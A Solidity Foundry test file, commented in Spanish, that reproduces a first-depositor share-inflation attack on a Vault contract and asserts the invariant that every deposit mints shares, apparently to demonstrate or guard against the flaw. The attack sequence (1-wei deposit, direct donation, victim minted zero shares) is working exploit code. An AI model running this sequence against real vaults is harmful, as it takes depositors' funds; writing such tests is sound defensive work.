// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Vault} from "../src/Vault.sol";

/// @dev Direccion documentada de los cheatcodes de Foundry. Se declara aqui
///      para que la capsula no dependa de `forge-std`: una capsula que exige
///      `forge install` no corre en una maquina limpia.
interface Vm {
    function deal(address quien, uint256 cuanto) external;
}

Vm constant VM = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

/// @dev Cada depositante es un contrato con balance propio, para que el Vault
///      vea `msg.sender` distinto sin recurrir a `vm.prank`.
contract Actor {
    receive() external payable {}

    function depositar(Vault vault) external payable {
        vault.depositar{value: msg.value}();
    }

    function donar(Vault vault, uint256 cuanto) external {
        (bool ok, ) = address(vault).call{value: cuanto}("");
        require(ok, "donacion fallida");
    }

    function retirar(Vault vault, uint256 cantidad) external {
        vault.retirar(cantidad);
    }
}

/// INVARIANTE `acciones-positivas-por-deposito`:
///     shares_emitidas(depositante) > 0   para todo deposito de al menos 1 wei
///
/// Esta prueba AFIRMA el invariante. En la version vulnerable TIENE QUE FALLAR:
/// el rojo de aqui es la capsula funcionando, no la suite rota.
contract PruebaAtaque {
    Vault vault;
    Actor atacante;
    Actor victima;

    function setUp() public {
        vault = new Vault();
        atacante = new Actor();
        victima = new Actor();
        VM.deal(address(atacante), 2 ether);
        VM.deal(address(victima), 1 ether);
    }

    function test_inflacionDeLaPrimeraAccion() public {
        // 1. el atacante entra con el minimo: 1 accion por 1 wei
        atacante.depositar{value: 1}(vault);

        // 2. dona 1 ether directamente: sube totalAssets sin emitir acciones,
        //    asi que el precio por accion se dispara
        atacante.donar(vault, 1 ether);

        // 3. la victima deposita 1 ether: (1e18 * 1) / (1e18 + 1) = 0 acciones
        victima.depositar{value: 1 ether}(vault);

        // INVARIANTE: un deposito de al menos 1 wei emite al menos 1 accion.
        // En el contrato vulnerable esta linea revierte: la victima pago y no
        // recibio nada. El motivo lleva el id del registro: el rojo se identifica solo.
        require(vault.shares(address(victima)) > 0, "acciones-positivas-por-deposito");
    }
}
